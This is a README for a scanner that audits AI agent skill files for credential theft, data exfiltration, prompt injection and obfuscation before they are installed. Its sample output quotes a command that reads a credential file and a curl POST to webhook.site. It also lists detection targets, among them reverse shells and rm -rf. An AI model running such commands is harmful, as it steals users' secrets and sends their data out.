# 🔒 Skill Auditor

**Security scanner for Clawdbot skills** - Detects malicious patterns before you install untrusted skills.

![Version](https://img.shields.io/badge/version-0.2.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)

## Why?

Skills are powerful - they can access files, make network requests, and influence your agent's behavior. Before installing a skill from the internet, audit it for:

- 🔑 **Credential theft** - API keys, SSH keys, tokens
- 📤 **Data exfiltration** - Sending your data to external servers
- 🎭 **Identity tampering** - Modifying SOUL.md, AGENTS.md
- 💉 **Prompt injection** - Hijacking your agent's instructions
- 🔐 **Code obfuscation** - Hidden malicious payloads

## Installation

```bash
# From ClawdHub
clawdbot skill install skill-auditor

# Or manually
git clone https://github.com/JarvisYVR/skill-auditor
cd skill-auditor
./install.sh
```

## Usage

### Quick Scan
```bash
skill-audit /path/to/SKILL.md
```

### JSON Output (for CI/CD)
```bash
skill-audit /path/to/SKILL.md json
```

### Full Analysis (with Docker sandbox)
```bash
skill-audit-full /path/to/SKILL.md
```

## Example Output

```
========================================
   SKILL AUDITOR v0.2
========================================
File: suspicious_skill.md
Size: 2341 bytes
SHA256: abc123...
========================================

=== THREAT ANALYSIS ===
⛔ [critical] credential_theft
   Access to sensitive path: .clawdbot/.env
   Evidence: 15:cat ~/.clawdbot/.env
   Score: +100

🔴 [high] data_exfiltration
   Known exfiltration endpoint: webhook.site
   Evidence: 18:curl -X POST https://webhook.site/abc
   Score: +70

========================================
   RISK ASSESSMENT
========================================
⛔ Risk Level: CRITICAL
   Threat Score: 170
   Findings: 2

   REJECT - Multiple severe threats
========================================
```

## Risk Levels

| Level | Score | Meaning |
|-------|-------|---------|
| 🟢 LOW | 0-49 | Safe for review |
| 🟠 MEDIUM | 50-99 | Review carefully |
| 🔴 HIGH | 100-149 | Don't install without analysis |
| ⛔ CRITICAL | 150+ | REJECT |

## Sandbox Analysis

With Docker, the auditor can:
- Execute extracted code in isolation
- Plant honeypot credentials
- Monitor file access via strace
- Detect runtime credential theft

```bash
skill-audit-full suspicious_skill.md
```

## Detection Rules

Built-in YARA rules detect:
- Credential file patterns (`.env`, `.aws/credentials`, SSH keys)
- Exfiltration endpoints (webhook.site, ngrok, requestbin)
- Identity file manipulation
- Prompt injection phrases
- Base64/eval obfuscation
- Filesystem abuse (rm -rf, /etc/passwd)
- Network backdoors (reverse shells)

## Contributing

Found a bypass? Submit a PR with:
1. Test case in `test-skills/`
2. Detection rule in `rules/malicious_skill.yar`
3. Pattern check in `audit.sh`

## License

MIT - Use freely, audit responsibly.

---

Made by [JarvisYVR](https://github.com/JarvisYVR) 🤖
